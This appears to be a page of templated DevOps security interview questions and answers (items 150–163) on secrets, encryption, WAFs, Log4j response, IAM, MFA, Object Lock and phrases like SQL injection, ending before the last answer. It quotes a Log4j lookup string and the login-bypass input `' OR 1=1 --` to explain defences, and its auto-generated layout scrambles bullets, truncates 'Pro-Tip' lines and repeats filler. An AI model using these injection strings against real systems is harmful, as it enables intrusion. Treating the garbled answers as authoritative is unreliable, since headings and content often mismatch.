#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Passing secrets as plain environment variables is a risk because they are visible in process trees (`/proc/pid/environ`), orchestration dashboards, and crash dumps.

- The application's pod starts an Init Container.
- The Init Container authenticates to the Vault using the Pod's Service Account identity (e.g., K8s JWT token via AWS IAM Roles for Service Accounts - IRSA).
- It fetches the secret dynamically from the Vault.

##### 2️⃣ Remediation & Permanent Safeguards

A hardened architecture involves a centralized vault (like HashiCorp Vault or AWS Secrets Manager) and a **Sidecar/Init Container Pattern**: ---

- It writes the secret to a shared memory-backed `tmpfs` volume (a RAM disk that never touches physical storage).
- The main application container starts, reads the secret from the memory volume directly, and the `tmpfs` is wiped the moment the pod is destroyed.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: The application's pod starts an Init Container..

#### ⏱️ 60-Second Elevator Pitch Summary

- The application's pod starts an Init Container.
- The Init Container authenticates to the Vault using the Pod's Service Account identity (e.g., K8s...
- It fetches the secret dynamically from the Vault.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-150-security-q9-a-compliance-standard-requires-that-all-data-at-rest-in-your-rds-databases-be-encrypted-how-does-aws-rds-encryption-work-and-what-is-transparent-data-encryption-tde-l2"></a>
### 150. Security Q9: A compliance standard requires that all data at rest in your RDS databases be encrypted How does AWS RDS encryption work and what is transparent data encryption (TDE) [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Security` • `Security` | **Type:** `Production Scenario [L2]`

**Tags:** `Security` `Security` `L2` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"A compliance standard requires that all data at rest in your RDS databases be encrypted. How does AWS RDS encryption work, and what is transparent data encryption (TDE)?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Security in modern DevOps must be automated into the pipeline rather than bolted on after deployment. The interviewer is testing: Disk-level encryption vs. database-level encryption (KMS vs TDE).. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

AWS RDS "Encryption at Rest" utilizes AWS KMS (Key Management Service). It operates at the underlying storage volume (EBS) level. When data is written to the disk, the hypervisor encrypts it; when read, it decrypts it. This protects against someone physically stealing the hard drive or gaining access to the raw EBS snapshots. However, any user with SQL access to the database queries the data in plaintext. **TDE (Transparent Data Encryption)**, offered by engines like SQL Server and Oracle, encrypts the data at the database page/file level *before* it hits the disk. For true end-to-end security involving PII, you must combine disk-level KMS with application-level or field-level encryption, where the application itself encrypts the SSN or credit card before inserting it, so even DB admins cannot run a `SELECT *` and see the plaintext. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: AWS RDS "Encryption at Rest" utilizes AWS KMS (Key Management Service). It operates at the underlying storage volume (EBS) level. .

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: AWS RDS "Encryption at Rest" utilizes AWS KMS (Key Management Service). It operates at the unde
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-151-security-q10-what-is-a-waf-and-how-does-it-differ-from-a-standard-network-firewall-l1"></a>
### 151. Security Q10: What is a WAF and how does it differ from a standard Network Firewall [L1]

**Level:** `Junior / Associate DevOps [L1]` | **Category:** `Security` • `Security` | **Type:** `Core Fundamentals [L1]`

**Tags:** `Security` `Security` `L1` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"What is a WAF, and how does it differ from a standard Network Firewall?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I respond to this security vulnerability, I emphasize immediate blast-radius containment. The interviewer is testing: OSI Layer 7 vs Layer 4 defense mechanisms.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

A standard Network Firewall (or AWS Security Group) operates at OSI Layers 3 & 4. It blocks IP addresses and network ports. It cannot see the *content* of the traffic. An attacker hitting an open port 443 with an SQL Injection attack walks right through a Network Firewall. A **WAF (Web Application Firewall)** operates at OSI Layer 7. It inspects the actual HTTP requests and headers (GET payloads, POST bodies). IT mitigates OWASP Top 10 vulnerabilities by pattern-matching malicious signatures, such as SQL Injection (SQLi), Cross-Site Scripting (XSS), or aggressive botnet crawling, blocking them *before* they reach the application code. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: A standard Network Firewall (or AWS Security Group) operates at OSI Layers 3 & 4. It blocks IP addresses and network ports. It can.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: A standard Network Firewall (or AWS Security Group) operates at OSI Layers 3 & 4. It blocks IP
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-152-security-q11-a-critical-vulnerability-in-a-popular-java-logging-framework-like-log4j-is-announced-on-a-friday-night-it-allows-remote-code-execution-rce-via-a-simple-http-header-you-have-500-microservices-how-do-you-respond-systematically-l3"></a>
### 152. Security Q11: A critical vulnerability in a popular Java logging framework (like Log4j) is announced on a Friday night It allows Remote Code Execution (RCE) via a simple HTTP header You have 500 microservices How do you respond systematically [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Security` • `Security` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Security` `Security` `L3` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"A critical vulnerability in a popular Java logging framework (like Log4j) is announced on a Friday night. It allows Remote Code Execution (RCE) via a simple HTTP header. You have 500 microservices. How do you respond systematically?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our DevSecOps implementation, we solved this by introducing automated security quality gates. The interviewer is testing: Zero-day incident response, mitigation hierarchy.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

I would execute a defense-in-depth response:

- **Immediate Mitigation (Edge Filtering):** I cannot patch 500 services instantly. Immediately deploy a WAF rule (AWS WAF/Cloudflare) globally to block incoming HTTP requests containing the known malicious exploit strings (e.g., `${jndi:ldap...}`). This protects the perimeter instantly.
- **Identification (Scanning):** Run an emergency vulnerability scan across all container registries and codebases using tools like Trivy or Snyk to identify exactly which of the 500 services actually use the vulnerable version of the library.
- **Internal Mitigation (Egress Control):** The RCE requires the compromised server to make an outbound connection to the attacker's server to download the payload. Ensure strict Egress Network Policies / Security Groups are in place. If a backend service doesn't need the internet, block its outbound traffic.

##### 2️⃣ Remediation & Permanent Safeguards

---

- **Remediation & Rollout (Patching):** Work with developer teams to upgrade the library in the identified services, build new images, and deploy them systematically over the weekend.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Immediate Mitigation (Edge Filtering): I cannot patch 500 services instantly. Immediately deploy a WAF rule (AWS WAF/Cloudflare) g.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Mitigation (Edge Filtering): I cannot patch 500 services instantly. Immediately deploy ...
- Identification (Scanning): Run an emergency vulnerability scan across all container registries an...
- Internal Mitigation (Egress Control): The RCE requires the compromised server to make an outbound...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-153-security-q12-what-is-cross-account-iam-role-assumption-and-why-is-it-considered-safer-than-creating-iam-users-in-every-account-l2"></a>
### 153. Security Q12: What is cross-account IAM role assumption and why is it considered safer than creating IAM users in every account [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Security` • `Security` | **Type:** `Production Scenario [L2]`

**Tags:** `Security` `Security` `L2` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"What is cross-account IAM role assumption, and why is it considered safer than creating IAM users in every account?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Least-privilege access, encrypted secrets in transit/at rest, and continuous vulnerability scanning are foundational. The interviewer is testing: STS AssumeRole, centralized identity management, reducing attack surface.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

If you have 10 AWS accounts (Dev, QA, Prod for various products), creating 10 individual IAM Users for an engineer means 10 sets of permanent access keys to manage, rotate, and potentially leak.

- The engineer has a single IAM User (or SSO identity) exclusively in a central "Identity Account".
- In the "Prod Account", an IAM Role is created that trusts the Identity Account.
- The engineer uses the AWS CLI/Console to run `AssumeRole`. AWS STS issues temporary, short-lived (e.g., 1 hour) credentials to act as that Role in the Prod Account.

##### 2️⃣ Remediation & Permanent Safeguards

A safer architecture is a **Hub and Spoke** model using `sts:AssumeRole`. This inherently forces credential expiration and allows security teams to manage all identities from a single pane of glass. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: The engineer has a single IAM User (or SSO identity) exclusively in a central "Identity Account"..

#### ⏱️ 60-Second Elevator Pitch Summary

- The engineer has a single IAM User (or SSO identity) exclusively in a central "Identity Account".
- In the "Prod Account", an IAM Role is created that trusts the Identity Account.
- The engineer uses the AWS CLI/Console to run AssumeRole. AWS STS issues temporary, short-lived (e...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-154-security-q13-how-does-asymmetric-encryption-public-key-cryptography-work-in-the-context-of-an-ssh-connection-l1"></a>
### 154. Security Q13: How does asymmetric encryption (Public Key cryptography) work in the context of an SSH connection [L1]

**Level:** `Junior / Associate DevOps [L1]` | **Category:** `Security` • `Security` | **Type:** `Core Fundamentals [L1]`

**Tags:** `Security` `Security` `L1` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"How does asymmetric encryption (Public Key cryptography) work in the context of an SSH connection?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Security in modern DevOps must be automated into the pipeline rather than bolted on after deployment. The interviewer is testing: Public/Private key pairs, authentication basics.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Asymmetric encryption uses two mathematically linked keys: a Public Key (which can be shared with anyone) and a Private Key (which must be kept completely secret by the user). Data encrypted by one can only be decrypted by the other.

- You place your **Public Key** in your user's `~/.ssh/authorized_keys` file on the server.
- When you attempt to connect, the server generates a random challenge message, encrypts it using your Public Key, and sends it back to your client.
- Your SSH client automatically decrypts this challenge using your **Private Key**, and sends the decrypted result back to the server.

##### 2️⃣ Remediation & Permanent Safeguards

When you SSH into a server: ---

- Because only your private key could have decrypted the challenge, the server mathematically verifies your identity and grants access.

#### 🎯 Key Architectural Takeaway
> Pro-Tip: You place your Public Key in your user's ~/.ssh/authorized_keys file on the server..

#### ⏱️ 60-Second Elevator Pitch Summary

- You place your Public Key in your user's ~/.ssh/authorized_keys file on the server.
- When you attempt to connect, the server generates a random challenge message, encrypts it using y...
- Your SSH client automatically decrypts this challenge using your Private Key, and sends the decry...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-155-security-q14-your-ci-cd-pipeline-builds-a-docker-image-and-pushes-it-to-ecr-how-do-you-ensure-that-only-container-images-explicitly-built-and-signed-by-your-ci-cd-pipeline-can-actually-run-in-your-kubernetes-production-cluster-l3"></a>
### 155. Security Q14: Your CI/CD pipeline builds a Docker image and pushes it to ECR How do you ensure that only container images explicitly built and signed by your CI/CD pipeline can actually run in your Kubernetes production cluster [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Security` • `Security` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Security` `Security` `L3` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"Your CI/CD pipeline builds a Docker image and pushes it to ECR. How do you ensure that only container images explicitly built and signed by your CI/CD pipeline can actually run in your Kubernetes production cluster?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I respond to this security vulnerability, I emphasize immediate blast-radius containment. The interviewer is testing: Container signing, Admission Controllers, Supply Chain Security.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

To secure the software supply chain against image substitution or tampering, we must implement **Image Signing and Admission Control**.

- **Signing:** During the CI/CD pipeline, after the image is built and vulnerability scanned successfully, we use a tool like **Cosign** or Docker Content Trust (Notary) to digitally sign the image hash using a private cryptographic key from our KMS. The signature is pushed to the registry alongside the image.
- **Enforcement:** In the production Kubernetes cluster, we deploy an **Admission Controller** (like Kyverno or OPA Gatekeeper). When the API server receives a request to create a Pod, the admission controller intercepts it.
- **Verification:** The admission controller pulls the signature from the registry and verifies it against our trusted Public Key before allowing the Pod to start. If developers try to `kubectl run` an unsigned image directly, K8s rejects it.

##### 2️⃣ Remediation & Permanent Safeguards

---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Signing: During the CI/CD pipeline, after the image is built and vulnerability scanned successfully, we use a tool like Cosign or .

#### ⏱️ 60-Second Elevator Pitch Summary

- Signing: During the CI/CD pipeline, after the image is built and vulnerability scanned successful...
- Enforcement: In the production Kubernetes cluster, we deploy an Admission Controller (like Kyvern...
- Verification: The admission controller pulls the signature from the registry and verifies it agai...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-156-security-q15-our-company-mandates-mfa-multi-factor-authentication-for-all-aws-console-logins-however-developers-are-still-using-static-aws-access-keys-in-their-local-terminals-which-bypasses-mfa-how-do-you-enforce-mfa-for-cli-access-l2"></a>
### 156. Security Q15: Our company mandates MFA (Multi-Factor Authentication) for all AWS Console logins However developers are still using static AWS Access Keys in their local terminals which bypasses MFA How do you enforce MFA for CLI access [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Security` • `Security` | **Type:** `Production Scenario [L2]`

**Tags:** `Security` `Security` `L2` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"Our company mandates MFA (Multi-Factor Authentication) for all AWS Console logins. However, developers are still using static AWS Access Keys in their local terminals which bypasses MFA. How do you enforce MFA for CLI access?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our DevSecOps implementation, we solved this by introducing automated security quality gates. The interviewer is testing: STS GetSessionToken, IAM condition keys for MFA.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Static AWS CLI access keys are essentially single-factor authentication. To enforce MFA on the CLI:

- Apply an **IAM Policy Condition** to the developers' IAM Group that explicitly denies all actions unless the `aws:MultiFactorAuthPresent` boolean is set to `true`.
- The developers must now use the `aws sts get-session-token` command, passing in their MFA device serial number and the 6-digit code from their authenticator app.
- STS returns a temporary Access Key, Secret Key, and Session Token. These temporary credentials carry the MFA claim, allowing the developer to bypass the IAM deny policy for the duration of the token (typically 8-12 hours). Tooling like AWS SSO v2 handles this seamlessly via browser popups.

##### 2️⃣ Remediation & Permanent Safeguards

---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Apply an IAM Policy Condition to the developers' IAM Group that explicitly denies all actions unless the aws:MultiFactorAuthPresen.

#### ⏱️ 60-Second Elevator Pitch Summary

- Apply an IAM Policy Condition to the developers' IAM Group that explicitly denies all actions unl...
- The developers must now use the aws sts get-session-token command, passing in their MFA device se...
- STS returns a temporary Access Key, Secret Key, and Session Token. These temporary credentials ca...

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-157-security-q16-explain-the-concept-of-a-bastion-host-jump-box-l1"></a>
### 157. Security Q16: Explain the concept of a Bastion Host (Jump Box) [L1]

**Level:** `Junior / Associate DevOps [L1]` | **Category:** `Security` • `Security` | **Type:** `Core Fundamentals [L1]`

**Tags:** `Security` `Security` `L1` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"Explain the concept of a Bastion Host (Jump Box)."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Least-privilege access, encrypted secrets in transit/at rest, and continuous vulnerability scanning are foundational. The interviewer is testing: Network segmentation, secure remote access.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

A Bastion Host is a heavily fortified, purpose-built server exposed to the public internet (in a public subnet), designed specifically to act as a secure gateway to access servers in a private network. Instead of exposing internal databases or application servers directly to the internet on port 22 (SSH), you place them in a private subnet with no public IPs. Administrators first SSH into the Bastion Host. From the Bastion Host, they then SSH securely into the internal private servers. The Bastion Host acts as a single, easily monitorable, tightly controlled choke point for all administrative access. Modern clouds often replace traditional Bastions with managed services like AWS Systems Manager (SSM) Session Manager. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: A Bastion Host is a heavily fortified, purpose-built server exposed to the public internet (in a public subnet), designed specific.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: A Bastion Host is a heavily fortified, purpose-built server exposed to the public internet (in
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-158-security-q17-an-aws-s3-bucket-holding-company-financial-reports-suffered-a-ransomware-attack-an-attacker-gained-access-enabled-aws-kms-encryption-using-their-own-key-which-they-control-and-locked-out-your-access-to-read-the-files-because-you-dont-have-access-to-their-kms-key-to-decrypt-it-how-do-you-architect-the-bucket-to-prevent-this-entirely-l3"></a>
### 158. Security Q17: An AWS S3 bucket holding company financial reports suffered a ransomware attack An attacker gained access enabled AWS KMS encryption using their own key (which they control) and locked out your access to read the files because you dont have access to their KMS key to decrypt it How do you architect the bucket to prevent this entirely [L3]

**Level:** `Staff SRE / Principal Architect [L3]` | **Category:** `Security` • `Security` | **Type:** `Staff SRE Scenario [L3]`

**Tags:** `Security` `Security` `L3` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"An AWS S3 bucket holding company financial reports suffered a ransomware attack. An attacker gained access, enabled AWS KMS encryption using their own key (which they control), and locked out your access to read the files because you don't have access to their KMS key to decrypt it. How do you architect the bucket to prevent this entirely?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Security in modern DevOps must be automated into the pipeline rather than bolted on after deployment. The interviewer is testing: S3 Versioning, Object Lock, immutable backups, WORM.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Standard S3 versioning is not enough here, as the attacker could maliciously encrypt the latest version *and* delete previous versions.

- Enable S3 Versioning and Object Lock on bucket creation.
- Configure a default retention period (e.g., 7 years) in **Compliance Mode**.

##### 2️⃣ Remediation & Permanent Safeguards

To mathematically prevent ransomware and ensure immutability, we must implement **S3 Object Lock in Compliance Mode**. When a file is written under Compliance Mode, it becomes WORM (Write Once, Read Many). Absolutely *no one*, not even the AWS Account Root User, can delete or modify the object version until the retention period expires. If an attacker uploads an encrypted version over the file, the previous completely unencrypted version is perfectly preserved, locked, and fully recoverable because the attacker is physically blocked by the AWS control plane from deleting it. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Enable S3 Versioning and Object Lock on bucket creation..

#### ⏱️ 60-Second Elevator Pitch Summary

- Enable S3 Versioning and Object Lock on bucket creation.
- Configure a default retention period (e.g., 7 years) in Compliance Mode.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-159-security-q18-during-a-pentest-the-testers-found-they-could-exploit-a-vulnerability-in-your-nodejs-app-to-read-etc-passwd-what-os-level-container-configuration-should-standardly-prevent-this-kind-of-filesystem-roaming-l2"></a>
### 159. Security Q18: During a pentest the testers found they could exploit a vulnerability in your Nodejs app to read /etc/passwd What OS-level container configuration should standardly prevent this kind of filesystem roaming [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Security` • `Security` | **Type:** `Production Scenario [L2]`

**Tags:** `Security` `Security` `L2` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"During a pentest, the testers found they could exploit a vulnerability in your Node.js app to read `/etc/passwd`. What OS-level container configuration should standardly prevent this kind of filesystem roaming?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I respond to this security vulnerability, I emphasize immediate blast-radius containment. The interviewer is testing: Read-only root filesystems, container hardening.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

A fundamental tenant of container hardening is running the container with a **Read-Only Root Filesystem**. In Kubernetes, this is achieved by setting `readOnlyRootFilesystem: true` in the pod's `securityContext`. In Docker, it's the `--read-only` flag. When enabled, the application cannot overwrite binaries, modify `/etc/passwd`, or drop malicious payloads onto the disk during an exploit. Any directory the app legitimately needs to write to (like `/tmp` for caching) must be explicitly mounted as an ephemeral `emptyDir` or `tmpfs` volume, leaving the rest of the OS immutable and highly frustrating for attackers. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: A fundamental tenant of container hardening is running the container with a Read-Only Root Filesystem..

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: A fundamental tenant of container hardening is running the container with a Read-Only Root File
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-160-security-q19-your-security-team-mandates-that-aws-iam-passwords-must-be-rotated-every-90-days-why-is-this-considered-an-outdated-practice-for-human-users-by-nist-guidelines-l2"></a>
### 160. Security Q19: Your security team mandates that AWS IAM passwords must be rotated every 90 days Why is this considered an outdated practice for human users by NIST guidelines [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Security` • `Security` | **Type:** `Production Scenario [L2]`

**Tags:** `Security` `Security` `L2` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"Your security team mandates that AWS IAM passwords must be rotated every 90 days. Why is this considered an outdated practice for human users by NIST guidelines?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"In our DevSecOps implementation, we solved this by introducing automated security quality gates. The interviewer is testing: Modern password philosophy vs legacy compliance.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Initial Diagnostics & Root Cause Analysis

Modern NIST (National Institute of Standards and Technology) guidelines advise *against* arbitrary periodic password rotation for human users.

- Enforce strong, complex passwords or passphrases initially.
- Enforce strict MFA (hardware tokens or authenticators).
- Do not force rotation unless there is evidence of a breach or compromise.

##### 2️⃣ Remediation & Permanent Safeguards

Statistically, when forced to change passwords every 90 days, humans adopt poor, predictable behaviors to cope. They use patterns (e.g., `PasswordFall2023!`, `PasswordWinter2023!`), resulting in weaker overall security that attackers can easily guess. The advised modern approach is: ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Enforce strong, complex passwords or passphrases initially..

#### ⏱️ 60-Second Elevator Pitch Summary

- Enforce strong, complex passwords or passphrases initially.
- Enforce strict MFA (hardware tokens or authenticators).
- Do not force rotation unless there is evidence of a breach or compromise.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-161-security-q20-what-is-a-man-in-the-middle-mitm-attack-and-how-does-tls-prevent-it-l1"></a>
### 161. Security Q20: What is a Man-in-the-Middle (MITM) attack and how does TLS prevent it [L1]

**Level:** `Junior / Associate DevOps [L1]` | **Category:** `Security` • `Security` | **Type:** `Core Fundamentals [L1]`

**Tags:** `Security` `Security` `L1` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"What is a Man-in-the-Middle (MITM) attack, and how does TLS prevent it?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Least-privilege access, encrypted secrets in transit/at rest, and continuous vulnerability scanning are foundational. The interviewer is testing: HTTPS, Certificate Authorities, encryption in transit.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

A Man-in-the-Middle (MITM) attack occurs when an attacker secretly intercepts and relays communications between two parties who believe they are communicating directly (e.g., over public Wi-Fi). TLS prevents this through **Authentication via Certificates**. When a browser connects to a server via HTTPS, the server presents a digital Certificate cryptographically signed by a trusted third-party Certificate Authority (CA) that the browser's OS pre-trusts. The browser mathematically verifies the signature to guarantee the server is legitimately the owner of the domain (Authentication), and then safely negotiates a shared symmetric encryption key. The attacker cannot impersonate the server because they do not have the private key corresponding to the CA-signed certificate, making interception impossible. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: A Man-in-the-Middle (MITM) attack occurs when an attacker secretly intercepts and relays communications between two parties who be.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: A Man-in-the-Middle (MITM) attack occurs when an attacker secretly intercepts and relays commun
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-162-security-q21-explain-the-difference-between-phishing-and-spear-phishing-l1"></a>
### 162. Security Q21: Explain the difference between Phishing and Spear Phishing [L1]

**Level:** `Junior / Associate DevOps [L1]` | **Category:** `Security` • `Security` | **Type:** `Core Fundamentals [L1]`

**Tags:** `Security` `Security` `L1` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"Explain the difference between Phishing and Spear Phishing."*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"Security in modern DevOps must be automated into the pipeline rather than bolted on after deployment. The interviewer is testing: Social engineering attack vectors and targeted threat actors.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

**Phishing** is a broad, untargeted attack where malicious actors send mass emails (e.g., "Your PayPal account is locked") to millions of random people simultaneously. The goal is sheer volume, hoping a small fraction of recipients will mistakenly click the malicious link and enter their credentials. **Spear Phishing** is a highly targeted attack directed at a specific individual or organization. Attackers conduct deep reconnaissance (LinkedIn, social media) to craft a highly convincing, personalized message (e.g., an email appearing to come from the CEO to the CFO requesting an urgent wire transfer to a specific vendor). It is much harder to detect and is often the entry point for major corporate breaches. ---

#### 🎯 Key Architectural Takeaway
> Pro-Tip: Phishing is a broad, untargeted attack where malicious actors send mass emails (e.g., "Your PayPal account is locked") to millions.

#### ⏱️ 60-Second Elevator Pitch Summary

- Immediate Triage: Phishing is a broad, untargeted attack where malicious actors send mass emails (e.g., "Your Pay
- Run targeted verification commands before modifying configuration.
- Automate permanent guardrails (CI check, alerts, IaC policy) to prevent recurrence.

[⚡ Practice this question interactively on interview.naveedkumbhar.com](https://interview.naveedkumbhar.com/?cat=aws)

</details>

---

<a id="scenario-163-security-q22-an-attacker-discovers-they-can-bypass-your-applications-login-form-by-entering-or-1-1-into-the-username-field-what-is-this-attack-and-how-do-you-prevent-it-natively-in-code-l2"></a>
### 163. Security Q22: An attacker discovers they can bypass your applications login form by entering  OR 1=1 -- into the username field What is this attack and how do you prevent it natively in code [L2]

**Level:** `Senior DevOps / SRE [L2]` | **Category:** `Security` • `Security` | **Type:** `Production Scenario [L2]`

**Tags:** `Security` `Security` `L2` `DevSecOps` `Compliance`

> **Interview Question:**  
> *"An attacker discovers they can bypass your application's login form by entering `' OR 1=1 --` into the username field. What is this attack, and how do you prevent it natively in code?"*

<details>
<summary><b>🔍 Click to expand Production Runbook & Senior Engineer Answer</b></summary>

#### 🎙️ Senior Engineer First-Person Context
"When an interviewer asks how I respond to this security vulnerability, I emphasize immediate blast-radius containment. The interviewer is testing: SQL Injection (SQLi), Parameterized Queries, input sanitization vs raw concatenation.. I structure my answer around systematic triage first, root cause analysis second, and permanent remediation third."

#### 📋 Step-by-Step Diagnostic & Resolution Runbook

##### 1️⃣ Production Solution & Architecture

